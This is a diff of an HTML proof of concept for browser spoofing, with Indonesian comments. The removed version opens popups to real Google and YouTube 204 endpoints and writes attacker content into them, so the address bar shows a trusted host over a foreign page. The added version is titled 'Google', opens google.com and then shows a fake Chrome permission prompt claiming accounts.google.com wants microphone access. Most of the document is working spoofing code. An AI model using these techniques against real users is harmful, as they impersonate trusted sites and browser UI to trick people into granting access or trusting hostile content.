@@ -1,40 +1,37 @@
-<!-- 52 | ⭐ ABORT LINTAS-ORIGIN — inilah cara "bar menulis google.com, layar milikku" | [1-CLICK]
-     Kalau 51 menunjukkan build-mu gagal ke arah "TIDAK MUNDUR", maka file ini yang mengubahnya
-     jadi laporan mahal — karena URL yang tersangkut bisa kita PILIH, dan dia bukan milik kita.
-     MEKANISME  jendela dibuka, lalu dinavigasi ke endpoint 204 di host TARGET. Bar mencatat
-     host target di titik commit-pending. Abort datang. Kalau bar tidak mundur, ia tetap
-     menulis host target — sementara dokumennya masih initial empty document yang MEWARISI
-     origin kita, jadi document.write tetap boleh.
-     Hasilnya persis: address bar = situs orang, konten = halaman kita, nol XSS, nol UXSS.
-     Lima host disapu berdampingan supaya kamu tahu mana yang punya endpoint 204 hidup.
-     Perluas sendiri: daftar + cara mencarinya ada di 204-endpoints.txt.
-     ETIKA  GET biasa ke endpoint publik, satu kali, tanpa payload — persis seperti membuka tab.
-     Host yang boleh kamu sentuh saja. Nol form, nol kredensial, nol peniruan merek.
-     EXPECTED-SECURE  bar mundur ke about:blank begitu navigasi batal. -->
-<button onclick="go()">Run 52</button>
-<pre id=g style="font:12px/1.7 monospace"></pre>
+<!DOCTYPE html>
+<html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Google</title>
+<style>
+ body{font-family:'Segoe UI',Roboto,system-ui;margin:0;padding:40px;text-align:center}
+ .run{font-size:16px;padding:12px 24px;border:0;border-radius:8px;background:#1a73e8;color:#fff;font-weight:600;cursor:pointer}
+ #prompt{position:fixed;top:8px;left:14px;width:404px;max-width:92vw;background:#fff;border:1px solid #dadce0;
+   border-radius:0 0 12px 12px;box-shadow:0 6px 24px rgba(0,0,0,.22);padding:16px 18px;display:none;text-align:left}
+ #prompt .site{font-size:14px;margin-bottom:14px}#prompt .site b{font-weight:600}
+ #prompt .perm{display:flex;align-items:center;gap:10px;font-size:14px;margin-bottom:16px}
+ #prompt .btns{display:flex;justify-content:flex-end;gap:8px}
+ #prompt .btns button{font-size:14px;padding:8px 16px;border-radius:18px;border:1px solid #dadce0;background:#fff;color:#1a73e8;font-weight:600;cursor:pointer}
+ #prompt .btns .allow{background:#1a73e8;color:#fff;border-color:#1a73e8}
+</style></head>
+<body>
+  <button class="run" onclick="go()">Buka Google</button>
+
+  <div id="prompt">
+    <div class="site"><b>accounts.google.com</b> wants to</div>
+    <div class="perm">
+      <svg viewBox="0 0 24 24" width="20" height="20" fill="#5f6368"><path d="M12 14a3 3 0 003-3V5a3 3 0 00-6 0v6a3 3 0 003 3zm5-3a5 5 0 01-10 0H5a7 7 0 006 6.92V21h2v-3.08A7 7 0 0019 11h-2z"/></svg>
+      <span>Use your microphone</span>
+    </div>
+    <div class="btns"><button onclick="hide()">Block</button><button class="allow" onclick="allow()">Allow</button></div>
+  </div>
+
 <script>
-var H = ['https://www.google.com/gen_204', 'https://www.gstatic.com/generate_204',
-  'https://clients3.google.com/generate_204', 'https://www.youtube.com/generate_204',
-  'https://connectivitycheck.gstatic.com/generate_204'];
-g.textContent = 'REAL ORIGIN: ' + location.href;
-function go() {
-  H.forEach(function (u, i) {
-    setTimeout(function () {
-      var w = window.open(u, '_blank', 'width=340,height=220,left=' + (20 + (i % 3) * 350) + ',top=' + (40 + Math.floor(i / 3) * 260));
-      if (!w) return;
-      setTimeout(function () {
-        try {
-          w.document.write('<div style="font:13px system-ui;padding:12px"><b>Konten ini milik ' + location.origin + '</b>' +
-            '<p style="font:11px monospace">bar di atas menulis apa?</p></div>');
-          w.document.close();
-        } catch (e) { }
-      }, 2400);
-    }, i * 800);
-  });
-  g.textContent = 'REAL ORIGIN: ' + location.origin + '\n5 jendela dibuka:\n' +
-    H.map(function (u, i) { return '  ' + (i + 1) + '. ' + u.replace('https://', '').padEnd(42) + 'bar: ______'; }).join('\n') +
-    '\n\nBar menulis HOST TUJUAN + isi tulisan kita = screenshot SEKARANG, lalu STOP.' +
-    '\nBar kosong = arah gagal yang satunya (tetap temuan, lihat 15).';
+function go(){
+  window.open('https://www.google.com/', '_blank');          // buka Google (tab baru; timer tetap hidup)
+  setTimeout(function(){                                       // delay 10 detik
+    document.getElementById('prompt').style.display = 'block';
+  }, 10000);
 }
+function hide(){ document.getElementById('prompt').style.display = 'none'; }
+function allow(){ document.getElementById('prompt').innerHTML = '<div style="font-size:14px">✔ Allow diklik (PoC — tidak ada izin nyata diminta).</div>'; }
 </script>
+</body></html>
